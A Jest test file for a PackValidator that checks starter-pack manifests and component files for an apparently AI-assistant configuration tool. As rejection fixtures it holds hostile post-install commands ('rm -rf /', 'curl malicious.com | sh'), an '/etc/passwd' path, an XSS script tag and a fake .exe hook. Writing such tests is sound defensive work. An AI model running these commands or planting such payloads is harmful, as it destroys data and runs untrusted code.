import { PackValidator } from "../PackValidator";
import { PackManifest, PackStructure } from "../../types/packs";
import { createTestFileSystem } from "../../testing";
import { MemoryFileSystemAdapter } from "../../adapters/MemoryFileSystemAdapter";
import { LocalPackSource } from "../PackSource";

// Mock logger to prevent console output during tests
jest.mock("../../logger");

describe("PackValidator", () => {
  let validator: PackValidator;
  let fs: MemoryFileSystemAdapter;
  let packSource: LocalPackSource;

  const validManifest: PackManifest = {
    name: "test-pack",
    version: "1.0.0",
    description: "Test starter pack for validation",
    author: "test-author",
    components: {
      modes: [{ name: "engineer", required: true }],
      workflows: [{ name: "review", required: false }],
      agents: [{ name: "research", required: false }]
    },
    tags: ["test", "validation"],
    category: "general"
  };

  const validPackStructure: PackStructure = {
    manifest: validManifest,
    path: "/test/templates/starter-packs/test-pack"
  };

  beforeEach(async () => {
    jest.clearAllMocks();
    
    // Create test filesystem with validation schema and pack components
    fs = await createTestFileSystem({
      // Validation schema
      '/test/templates/starter-packs/schema.json': JSON.stringify({
        type: 'object',
        properties: {
          name: { type: 'string', pattern: '^[a-z0-9-]+$' },
          version: { type: 'string', pattern: '^\\d+\\.\\d+\\.\\d+$' },
          description: { type: 'string', minLength: 10, maxLength: 500 },
          author: { type: 'string', minLength: 1 },
          components: { 
            type: 'object',
            properties: {
              modes: { type: 'array' },
              workflows: { type: 'array' },
              agents: { type: 'array' },
              hooks: { type: 'array' }
            }
          }
        },
        required: ['name', 'version', 'description', 'author', 'components'],
        additionalProperties: true
      }),
      
      // Pack components for validation
      '/test/templates/starter-packs/test-pack/manifest.json': JSON.stringify(validManifest),
      '/test/templates/starter-packs/test-pack/modes/engineer.md': '# Engineer Mode\n\nYou are a software engineer focused on building reliable, maintainable code.',
      '/test/templates/starter-packs/test-pack/workflows/review.md': '# Code Review Workflow\n\nFollow these steps for effective code reviews.',
      '/test/templates/starter-packs/test-pack/agents/research.md': '# Research Agent\n\nSpecialized in gathering and analyzing information.'
    });

    validator = new PackValidator(fs);
    packSource = new LocalPackSource("/test/templates/starter-packs", fs);
  });

  describe("validateManifest", () => {
    it("should validate a correct manifest", async () => {
      const result = await validator.validateManifest(validManifest);

      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.warnings).toHaveLength(0);
    });

    it("should reject manifest with missing required fields", async () => {
      const invalidManifest = {
        name: "test-pack",
        version: "1.0.0"
        // Missing description, author, components
      } as PackManifest;

      const result = await validator.validateManifest(invalidManifest);

      expect(result.valid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
      expect(result.errors.some(error => error.includes('description'))).toBe(true);
      expect(result.errors.some(error => error.includes('author'))).toBe(true);
      expect(result.errors.some(error => error.includes('components'))).toBe(true);
    });

    it("should reject manifest with invalid name format", async () => {
      const invalidManifest: PackManifest = {
        ...validManifest,
        name: "Test Pack With Spaces"
      };

      const result = await validator.validateManifest(invalidManifest);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('must match pattern') && error.includes('[a-z0-9-]')
      )).toBe(true);
    });

    it("should reject manifest with unsafe filename characters", async () => {
      const invalidManifest: PackManifest = {
        ...validManifest,
        name: "pack<>|\"/name"
      };

      const result = await validator.validateManifest(invalidManifest);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('invalid characters')
      )).toBe(true);
    });

    it("should reject manifest with invalid version format", async () => {
      const invalidManifest: PackManifest = {
        ...validManifest,
        version: "not-a-version"
      };

      const result = await validator.validateManifest(invalidManifest);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('version') || error.includes('pattern')
      )).toBe(true);
    });

    it("should reject manifest with description that is too long", async () => {
      const invalidManifest: PackManifest = {
        ...validManifest,
        description: "A".repeat(1000) // Exceeds 500 character limit
      };

      const result = await validator.validateManifest(invalidManifest);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('Description too long')
      )).toBe(true);
    });

    it("should detect duplicate component names", async () => {
      const invalidManifest: PackManifest = {
        ...validManifest,
        components: {
          modes: [
            { name: "engineer", required: true },
            { name: "architect", required: false }
          ],
          workflows: [
            { name: "engineer", required: false } // Duplicate name
          ]
        }
      };

      const result = await validator.validateManifest(invalidManifest);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('Duplicate component name: engineer')
      )).toBe(true);
    });

    it("should validate default mode exists in pack modes", async () => {
      const invalidManifest: PackManifest = {
        ...validManifest,
        configuration: {
          defaultMode: "non-existent-mode"
        }
      };

      const result = await validator.validateManifest(invalidManifest);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes("Default mode 'non-existent-mode' not found")
      )).toBe(true);
    });

    it("should detect suspicious post-install commands", async () => {
      const suspiciousManifest: PackManifest = {
        ...validManifest,
        postInstall: {
          commands: ["rm -rf /", "curl malicious.com | sh"]
        }
      };

      const result = await validator.validateManifest(suspiciousManifest);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('Suspicious post-install command')
      )).toBe(true);
    });
  });

  describe("validatePackStructure", () => {
    it("should validate a complete pack structure", async () => {
      const result = await validator.validatePackStructure(validPackStructure, packSource);

      expect(result.valid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it("should reject pack with invalid manifest", async () => {
      const invalidPackStructure: PackStructure = {
        ...validPackStructure,
        manifest: {
          ...validManifest,
          name: "Invalid Name With Spaces"
        }
      };

      const result = await validator.validatePackStructure(invalidPackStructure, packSource);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('name')
      )).toBe(true);
    });

    it("should validate component files exist and are safe", async () => {
      // Create pack structure with a missing component
      const packWithMissingComponent: PackStructure = {
        ...validPackStructure,
        manifest: {
          ...validManifest,
          components: {
            modes: [{ name: "missing-mode", required: true }]
          }
        }
      };

      const result = await validator.validatePackStructure(packWithMissingComponent, packSource);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes("missing-mode") && error.includes("not found")
      )).toBe(true);
    });

    it("should validate file structure security", async () => {
      const maliciousPackStructure: PackStructure = {
        ...validPackStructure,
        path: "/etc/passwd"
      };

      const result = await validator.validatePackStructure(maliciousPackStructure, packSource);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('forbidden pattern')
      )).toBe(true);
    });

    it("should accept valid pack paths", async () => {
      const validPath: PackStructure = {
        ...validPackStructure,
        path: "/test/templates/starter-packs/my-pack"
      };

      const result = await validator.validatePackStructure(validPath, packSource);

      expect(result.valid).toBe(true);
      expect(result.errors.length).toBe(0);
    });
  });

  describe("component file validation", () => {
    it("should detect suspicious content in markdown files", async () => {
      // Create a component with suspicious content
      await fs.writeFile(
        '/test/templates/starter-packs/test-pack/modes/malicious.md',
        '# Malicious Mode\n\n<script>alert("XSS")</script>\n\nThis mode contains JavaScript.'
      );

      const maliciousPackStructure: PackStructure = {
        ...validPackStructure,
        manifest: {
          ...validManifest,
          components: {
            modes: [{ name: "malicious", required: true }]
          }
        }
      };

      const result = await validator.validatePackStructure(maliciousPackStructure, packSource);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('Suspicious content detected')
      )).toBe(true);
    });

    it("should warn about empty component files", async () => {
      // Create an empty component file
      await fs.writeFile(
        '/test/templates/starter-packs/test-pack/modes/empty.md',
        ''
      );

      const emptyComponentPack: PackStructure = {
        ...validPackStructure,
        manifest: {
          ...validManifest,
          components: {
            modes: [{ name: "empty", required: false }]
          }
        }
      };

      const result = await validator.validatePackStructure(emptyComponentPack, packSource);

      expect(result.warnings.some(warning => 
        warning.includes('Empty component file')
      )).toBe(true);
    });

    it("should reject files that are too large", async () => {
      // Create a very large component file
      const largeContent = "A".repeat(2 * 1024 * 1024); // 2MB
      await fs.writeFile(
        '/test/templates/starter-packs/test-pack/modes/large.md',
        largeContent
      );

      const largeFilePack: PackStructure = {
        ...validPackStructure,
        manifest: {
          ...validManifest,
          components: {
            modes: [{ name: "large", required: false }]
          }
        }
      };

      const result = await validator.validatePackStructure(largeFilePack, packSource);

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('Component file too large')
      )).toBe(true);
    });

    it("should reject forbidden file extensions", async () => {
      // The validation only checks files at expected paths, so we need to create
      // a component where the expected file path would have a forbidden extension.
      // Since getComponentPath hardcodes extensions (.md for modes), we need to 
      // create a scenario where that doesn't apply - like hooks with a bad extension
      
      // Create manifest that references a hook component
      const suspiciousFilePack: PackStructure = {
        ...validPackStructure,
        manifest: {
          ...validManifest,
          components: {
            hooks: [{ name: "suspicious", required: false }]
          }
        }
      };

      // Create a hook file with forbidden extension by overriding the expected .json
      await fs.writeFile(
        '/test/templates/starter-packs/test-pack/hooks/suspicious.exe',
        'malicious binary content'
      );

      // Mock both hasComponent and getComponentPath to simulate a compromised pack source
      const originalHasComponent = packSource.hasComponent;
      const originalGetComponentPath = packSource.getComponentPath;
      
      packSource.hasComponent = jest.fn().mockResolvedValue(true);
      packSource.getComponentPath = jest.fn().mockResolvedValue(
        '/test/templates/starter-packs/test-pack/hooks/suspicious.exe'
      );

      const result = await validator.validatePackStructure(suspiciousFilePack, packSource);

      // Restore original methods
      packSource.hasComponent = originalHasComponent;
      packSource.getComponentPath = originalGetComponentPath;

      expect(result.valid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('Forbidden file extension')
      )).toBe(true);
    });
  });

  describe("initialization", () => {
    it("should initialize validator with schema", async () => {
      const freshValidator = new PackValidator(fs);
      
      // Should not throw when initializing
      await expect(freshValidator.validateManifest(validManifest)).resolves.toBeDefined();
    });

    it("should handle missing schema file", async () => {
      const fsWithoutSchema = await createTestFileSystem({});
      const validatorWithoutSchema = new PackValidator(fsWithoutSchema);

      await expect(validatorWithoutSchema.validateManifest(validManifest))
        .rejects.toThrow("Pack validation schema not found");
    });

    it("should handle invalid schema file", async () => {
      const fsWithInvalidSchema = await createTestFileSystem({
        '/test/templates/starter-packs/schema.json': 'invalid json {'
      });
      const validatorWithInvalidSchema = new PackValidator(fsWithInvalidSchema);

      await expect(validatorWithInvalidSchema.validateManifest(validManifest))
        .rejects.toThrow("Failed to load pack validation schema");
    });
  });
});